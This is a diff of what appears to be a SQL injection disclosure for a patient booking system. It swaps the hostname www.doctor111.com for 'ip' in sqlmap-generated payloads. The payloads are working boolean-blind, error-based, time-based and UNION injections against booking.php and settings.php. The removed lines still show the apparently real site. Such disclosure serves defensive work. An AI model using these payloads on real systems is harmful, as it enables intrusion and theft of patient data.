@@ -56,19 +56,19 @@ sqlmap identified the following injection point(s) with a total of 71 HTTP(s) re
 Parameter: #1* (URI)
     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: http://www.doctor111.com:80/patient/booking.php?id=1 AND 7686=7686
+    Payload: http://ip/patient/booking.php?id=1 AND 7686=7686
 
     Type: error-based
     Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
-    Payload: http://www.doctor111.com:80/patient/booking.php?id=1 OR (SELECT 3032 FROM(SELECT COUNT(*),CONCAT(0x717a6a7071,(SELECT (ELT(3032=3032,1))),0x7170787a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Payload: http://ip/patient/booking.php?id=1 OR (SELECT 3032 FROM(SELECT COUNT(*),CONCAT(0x717a6a7071,(SELECT (ELT(3032=3032,1))),0x7170787a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
 
     Type: time-based blind
     Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-    Payload: http://www.doctor111.com:80/patient/booking.php?id=1 AND (SELECT 8632 FROM (SELECT(SLEEP(5)))HCPI)
+    Payload: http://ip/patient/booking.php?id=1 AND (SELECT 8632 FROM (SELECT(SLEEP(5)))HCPI)
 
     Type: UNION query
     Title: Generic UNION query (NULL) - 13 columns
-    Payload: http://www.doctor111.com:80/patient/booking.php?id=-4821 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x717a6a7071,0x4247754365636f69425457434250756e6877504d52795463504f436950496d726376685a64465049,0x7170787a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+    Payload: http://ip/patient/booking.php?id=-4821 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x717a6a7071,0x4247754365636f69425457434250756e6877504d52795463504f436950496d726376685a64465049,0x7170787a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
 ---
 ```
 
@@ -116,19 +116,19 @@ sqlmap identified the following injection point(s) with a total of 177 HTTP(s) r
 Parameter: #1* (URI)
     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
-    Payload: http://www.doctor111.com:80/patient/settings.php?action=edit&id=1' AND 3197=(SELECT (CASE WHEN (3197=3197) THEN 3197 ELSE (SELECT 9367 UNION SELECT 1506) END))-- -&error=0
+    Payload: http://ip/patient/settings.php?action=edit&id=1' AND 3197=(SELECT (CASE WHEN (3197=3197) THEN 3197 ELSE (SELECT 9367 UNION SELECT 1506) END))-- -&error=0
 
     Type: error-based
     Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
-    Payload: http://www.doctor111.com:80/patient/settings.php?action=edit&id=1' OR (SELECT 3493 FROM(SELECT COUNT(*),CONCAT(0x7162786a71,(SELECT (ELT(3493=3493,1))),0x717a6a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ITWX&error=0
+    Payload: http://ip/patient/settings.php?action=edit&id=1' OR (SELECT 3493 FROM(SELECT COUNT(*),CONCAT(0x7162786a71,(SELECT (ELT(3493=3493,1))),0x717a6a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ITWX&error=0
 
     Type: time-based blind
     Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-    Payload: http://www.doctor111.com:80/patient/settings.php?action=edit&id=1' AND (SELECT 6213 FROM (SELECT(SLEEP(5)))kZmv)-- SfKb&error=0
+    Payload: http://ip/patient/settings.php?action=edit&id=1' AND (SELECT 6213 FROM (SELECT(SLEEP(5)))kZmv)-- SfKb&error=0
 
     Type: UNION query
     Title: Generic UNION query (NULL) - 8 columns
-    Payload: http://www.doctor111.com:80/patient/settings.php?action=edit&id=-6866' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7162786a71,0x78415242537376577872514272566a74536270524449464568776d4e5a577a57524e676b62644d57,0x717a6a7071)-- -&error=0
+    Payload: http://ip/patient/settings.php?action=edit&id=-6866' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7162786a71,0x78415242537376577872514272566a74536270524449464568776d4e5a577a57524e676b62644d57,0x717a6a7071)-- -&error=0
 ---
 ```
 
